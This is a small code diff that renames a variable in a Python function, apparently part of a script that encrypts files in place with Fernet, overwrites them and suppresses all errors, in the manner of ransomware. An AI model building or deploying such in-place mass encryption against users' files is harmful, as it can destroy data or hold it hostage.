@@ -103,7 +103,7 @@ def encryption_process():
                 contentz = opnfs.read()
 
             with open(fs[1:], 'wb') as wfs:
-                wfs.write(Fernet(Key).encrypt(contentz))
+                wfs.write(Fernet(key).encrypt(contentz))
                 print(f"Encrypted: {fs[1:]}")
         except:
             pass
